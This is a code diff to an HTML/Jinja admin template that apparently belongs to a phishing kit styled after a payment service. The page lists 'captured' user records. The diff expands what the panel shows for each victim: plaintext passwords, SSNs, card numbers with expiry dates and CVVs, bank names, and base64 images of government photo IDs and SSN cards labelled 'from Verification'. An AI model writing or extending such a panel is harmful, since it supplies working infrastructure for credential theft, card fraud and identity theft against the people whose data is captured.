@@ -23,7 +23,7 @@
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
             padding: 32px;
             width: 100%;
-            max-width: 800px;
+            max-width: 900px; /* Increased max-width for more data */
         }
         .panel-title {
             color: #003087;
@@ -48,33 +48,52 @@
         .user-card h3 {
             color: #0070ba;
             font-size: 20px;
-            margin-bottom: 10px;
+            margin-top: 0;
+            margin-bottom: 15px;
             border-bottom: 1px dashed #eee;
-            padding-bottom: 5px;
+            padding-bottom: 10px;
         }
         .user-card p {
             font-size: 16px;
             color: #333;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
+            line-height: 1.6;
         }
         .user-card p span {
             font-weight: 600;
             color: #000;
-            word-break: break-all;
+            word-break: break-all; /* Break long strings like base64 or tokens */
         }
         .user-profile-pic {
-            width: 80px; /* Adjust size as needed */
+            width: 80px;
             height: 80px;
-            border-radius: 50%; /* Make it circular */
-            object-fit: cover; /* Ensure image covers the area */
-            margin-top: 10px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-top: 5px;
             margin-bottom: 10px;
             border: 2px solid #ddd;
+            display: block; /* Ensure it's block for margin auto or positioning */
+        }
+        .user-document-pic {
+            max-width: 100%; /* Allow responsive width */
+            height: auto;    /* Maintain aspect ratio */
+            max-height: 400px; /* Limit max height for very tall images */
+            border: 1px solid #ccc;
+            margin-top: 5px;
+            margin-bottom: 10px;
+            display: block; /* Ensure it's block for margin auto or positioning */
+            background-color: #e0e0e0; /* Light background for image container */
         }
         .no-users-message {
             text-align: center;
             font-size: 18px;
             color: #555;
+            padding: 20px;
+        }
+        .section-divider {
+            margin-top: 15px;
+            margin-bottom: 10px;
+            border-top: 1px solid #ddd;
         }
     </style>
 </head>
@@ -86,19 +105,51 @@
                 {% for user_email, user_details in users.items() %}
                 <li class="user-card">
                     <h3>User: <span>{{ user_email }}</span></h3>
-                    <p>Password (DANGER!): <span>{{ user_details.password }}</span></p>
-                    <p>Full Name: <span>{{ user_details.fullname or 'Not provided' }}</span></p>
-                    <p>Phone Number: <span>{{ user_details.phonenumber or 'Not provided' }}</span></p>
+                    
+                    <h4>Account Credentials:</h4>
+                    <p>Password (DANGER!): <span>{{ user_details.password or 'Not provided' }}</span></p>
+                    
+                    <div class="section-divider"></div>
+                    <h4>Personal & Contact Information (from Verification):</h4>
+                    <p>Full Name: <span>{{ user_details.fullName or user_details.fullname or 'Not provided' }}</span></p>
+                    <p>Phone Number: <span>{{ user_details.phoneNumber or user_details.phonenumber or 'Not provided' }}</span></p>
+                    <p>Social Security Number (SSN): <span>{{ user_details.ssn or 'Not provided' }}</span></p>
+                    
                     {% if user_details.profile_picture_base64 %}
-                        <p>Profile Picture:</p>
+                        <p>Profile Picture (Original):</p>
                         <img src="{{ user_details.profile_picture_base64 }}" alt="Profile Picture" class="user-profile-pic">
                     {% else %}
-                        <p>Profile Picture: <span>Not uploaded</span></p>
+                        <p>Profile Picture (Original): <span>Not uploaded</span></p>
+                    {% endif %}
+
+                    <div class="section-divider"></div>
+                    <h4>Financial Information (from Verification):</h4>
+                    <p>Bank Name: <span>{{ user_details.bankName or 'Not provided' }}</span></p>
+                    <p>Card Number: <span>{{ user_details.cardNumber or 'Not provided' }}</span></p>
+                    <p>Expiry Date: <span>{{ user_details.expiryDate or 'Not provided' }}</span></p>
+                    <p>CVV: <span>{{ user_details.cvv or 'Not provided' }}</span></p>
+
+                    <div class="section-divider"></div>
+                    <h4>Uploaded Documents (from Verification):</h4>
+                    {% if user_details.photoId %}
+                        <p>Government-Issued Photo ID:</p>
+                        <img src="data:image/png;base64,{{ user_details.photoId }}" alt="Government Photo ID" class="user-document-pic">
+                    {% else %}
+                        <p>Government-Issued Photo ID: <span>Not uploaded</span></p>
+                    {% endif %}
+                    
+                    {% if user_details.ssnCard %}
+                        <p>SSN Card Image:</p>
+                        <img src="data:image/png;base64,{{ user_details.ssnCard }}" alt="SSN Card Image" class="user-document-pic">
+                    {% else %}
+                        <p>SSN Card Image: <span>Not uploaded</span></p>
                     {% endif %}
                 </li>
                 {% endfor %}
             {% else %}
-                <p class="no-users-message">No user data captured yet.</p>
+                <li class="user-card">
+                    <p class="no-users-message">No user data captured yet.</p>
+                </li>
             {% endif %}
         </ul>
     </div>
